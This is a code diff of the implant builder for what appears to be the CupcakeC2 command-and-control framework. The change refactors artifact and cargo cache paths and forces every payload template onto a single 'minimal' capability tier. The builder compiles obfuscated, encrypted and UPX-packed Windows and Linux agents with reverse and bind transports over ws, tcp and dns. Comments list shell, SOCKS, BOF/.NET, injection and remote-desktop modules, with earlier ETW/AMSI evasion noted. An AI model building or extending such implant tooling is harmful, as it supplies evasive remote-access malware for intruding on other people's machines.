@@ -11,6 +11,7 @@ import (
 	"strings"
 	"time"
 
+	"cupcake-server/pkg/paths"
 	"cupcake-server/pkg/store"
 	"cupcake-server/pkg/utils"
 
@@ -18,11 +19,16 @@ import (
 )
 
 const (
-	SourceDir      = "../Client"           // Relative to server/
-	BuildBaseDir   = "./temp_builds"      // Sandbox root
-	ArtifactDir    = "./storage/payloads" // Final storage
-	SharedTargetDir = "./storage/build_cache/target" // Shared cargo target directory
+	SourceDir    = "../Client"      // Relative to server/
+	BuildBaseDir = "./temp_builds" // Sandbox root
 )
+
+// ArtifactDir / SharedTargetDir / isolatedCargoHome resolve under CUPCAKE_DATA_DIR.
+func artifactDir() string    { return paths.Join("payloads") }
+func sharedTargetDir() string { return paths.Join("build_cache", "target") }
+func isolatedCargoHomeDir() string {
+	return paths.Join("build_cache", "cargo_home")
+}
 
 type PayloadConfig struct {
 	Arch              string `json:"arch"`
@@ -39,11 +45,9 @@ type PayloadConfig struct {
 	EncryptionSalt    string `json:"encryption_salt"`
 	ObfuscationMode   string `json:"obfuscation_mode"`
 	Jitter            int    `json:"jitter"`
-	// Capability profile: "minimal" | "standard" | "full" (default standard).
-	// Maps to cargo features on the client:
-	//   minimal  → transport + minimal post-ex (still includes Layer-A Nt process path on Windows)
-	//   standard → PTY/SOCKS/plugin/BOF/.NET; Windows Layer-A hardened APIs always on
-	//   full     → standard + stealth-adv (Layer-B: ETW/AMSI, NtCreateUserProcess with version gate + fallback)
+	// Profile is connection *direction* for UI (reverse/forward), NOT a cargo capability tier.
+	// Stage0 cargo features are always **minimal** (sole product aggregate).
+	// Heavy caps: L2 modules (desktop / inject / iso_host).
 	Profile string `json:"profile"`
 }
 
@@ -85,13 +89,11 @@ func validateC2Host(host string) error {
 	return nil
 }
 
-const isolatedCargoHome = "./storage/build_cache/cargo_home"
-
 // ensureIsolatedCargoHome creates a CARGO_HOME that ignores user ~/.cargo/config.toml
 // (which often forces replace-with=ustc behind a dead 127.0.0.1 proxy), while reusing
 // the user's registry/git caches via directory junctions (Windows) or symlinks.
 func ensureIsolatedCargoHome(logChan chan<- string) (string, error) {
-	home, err := filepath.Abs(isolatedCargoHome)
+	home, err := filepath.Abs(isolatedCargoHomeDir())
 	if err != nil {
 		return "", err
 	}
@@ -242,8 +244,8 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	workspace := filepath.Join(BuildBaseDir, buildID)
 	
 	os.MkdirAll(BuildBaseDir, 0755)
-	os.MkdirAll(ArtifactDir, 0755)
-	os.MkdirAll(SharedTargetDir, 0755)
+	os.MkdirAll(artifactDir(), 0755)
+	os.MkdirAll(sharedTargetDir(), 0755)
 
 	if logChan != nil { logChan <- "[Builder] 正在准备沙箱环境 (已启用增量编译缓存)..." }
 	if err := copyDir(SourceDir, workspace); err != nil {
@@ -362,26 +364,25 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		args = append(args, "--target", target)
 	}
 
-	// Forward and reverse share the SAME capability tier: minimal
-	//   shell/fs/proc/pty built-in; BOF/.NET via on-demand modules
-	// Protocol only differs: bind → tcp_bind; reverse → ws/tcp/dns
+	// Sole product cargo tier: always minimal (ignore legacy standard/full/beacon names).
+	// shell/fs/proc/pty/socks built-in; BOF/.NET → iso_host L2; RDP → desktop L2.
+	// conf.Profile remains reverse/forward direction for UI only.
 	capProfile := "minimal"
 	if p := strings.ToLower(strings.TrimSpace(conf.Profile)); p != "" {
 		switch p {
-		case "standard", "full":
-			// Explicit legacy monolith only if forced
-			capProfile = "standard"
-		default:
-			capProfile = "minimal"
+		case "standard", "full", "beacon":
+			if logChan != nil {
+				logChan <- fmt.Sprintf("[Builder] legacy profile %q ignored → cargo minimal", p)
+			}
 		}
 	}
 	isBind := protocol == "bind-tcp" || protocol == "正向tcp"
 	if logChan != nil {
-		logChan <- fmt.Sprintf("[Builder] Cargo profile: %s", capProfile)
+		logChan <- "[Builder] Cargo profile: minimal (sole product tier)"
 		if isBind {
-			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal（与反向同能力；BOF/.NET 按需模块）"
+			logChan <- "[Builder] 正向客户端 — tcp_bind + minimal（BOF/.NET/desktop 按需 L2 模块）"
 		} else {
-			logChan <- "[Builder] 反向客户端 — minimal（终端/文件/进程内置；BOF/.NET 按需模块）"
+			logChan <- "[Builder] 反向客户端 — minimal（终端/文件/进程/socks 内置；重能力 L2）"
 		}
 	}
 	if protocol == "tcp" {
@@ -398,7 +399,7 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 
 	if logChan != nil {
 		modeStr := "全量构建"
-		if _, err := os.Stat(SharedTargetDir); err == nil {
+		if _, err := os.Stat(sharedTargetDir()); err == nil {
 			modeStr = "增量加速模式"
 		}
 		logChan <- fmt.Sprintf("[Builder] 正在启动 Rust 编译器 (%s)...", modeStr)
@@ -406,7 +407,7 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	}
 
 	// ⚡ OPTIMIZATION: centralized target dir; 🛡️ remap paths for OPSEC
-	absTargetDir, _ := filepath.Abs(SharedTargetDir)
+	absTargetDir, _ := filepath.Abs(sharedTargetDir())
 	absWorkspace, _ := filepath.Abs(workspace)
 	env := cargoBuildEnv(absTargetDir, absWorkspace, cargoHome)
 
@@ -445,7 +446,7 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	ext := ""
 	if conf.OSType == "windows" { ext = ".exe" }
 	randSuffix, _ := utils.RandomAlphaString(8)
-	finalPath := filepath.Join(ArtifactDir, fmt.Sprintf("%s%s", randSuffix, ext))
+	finalPath := filepath.Join(artifactDir(), fmt.Sprintf("%s%s", randSuffix, ext))
 
 
 	if logChan != nil { logChan <- "[Builder] 正在对本地 Loader 执行配置补丁..." }
@@ -475,29 +476,28 @@ func RunUPX(path string) error {
 	return cmd.Run()
 }
 
-// RebuildTemplates (v3.0.1 Engine)
-// This function rebuilds all standard platform templates and moves them to server/assets
-// enabling the 'Patch' mode to always use the latest v3.0.1 features.
+// RebuildTemplates rebuilds all platform templates (always cargo **minimal**) into server/assets
+// for Patch mode. Legacy OutName `*_minimal` kept as compatible aliases of the same binary.
 func RebuildTemplates(logChan chan<- string) error {
-	if logChan != nil { logChan <- "[Rebuilder] 启动 CupcakeC2 v3.0.1 全平台模板自动化构建任务..." }
+	if logChan != nil { logChan <- "[Rebuilder] 启动全平台模板构建（唯一产品档 minimal）..." }
 	
 	targets := []struct {
 		OS       string
 		Arch     string
 		Protocol string
 		OutName  string
-		Profile  string
+		Profile  string // always "minimal" (sole product cargo tier)
 	}{
-		{"windows", "amd64", "ws", "client_template_windows.exe", "standard"},
-		{"windows", "i386", "ws", "client_template_windows_x86.exe", "standard"},
-		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "standard"},
+		{"windows", "amd64", "ws", "client_template_windows.exe", "minimal"},
+		{"windows", "i386", "ws", "client_template_windows_x86.exe", "minimal"},
+		{"windows", "amd64", "tcp", "client_template_windows_tcp.exe", "minimal"},
 		{"windows", "amd64", "tcp", "client_template_windows_tcp_minimal.exe", "minimal"},
-		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "standard"},
-		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "standard"},
-		{"linux", "amd64", "ws", "client_template_linux", "standard"},
-		{"linux", "amd64", "tcp", "client_template_linux_tcp", "standard"},
+		{"windows", "amd64", "dns", "client_template_windows_dns.exe", "minimal"},
+		{"windows", "amd64", "bind-tcp", "client_template_windows_bind.exe", "minimal"},
+		{"linux", "amd64", "ws", "client_template_linux", "minimal"},
+		{"linux", "amd64", "tcp", "client_template_linux_tcp", "minimal"},
 		{"linux", "amd64", "tcp", "client_template_linux_tcp_minimal", "minimal"},
-		{"linux", "arm64", "ws", "client_template_linux_arm64", "standard"},
+		{"linux", "arm64", "ws", "client_template_linux_arm64", "minimal"},
 	}
 
 	for _, t := range targets {
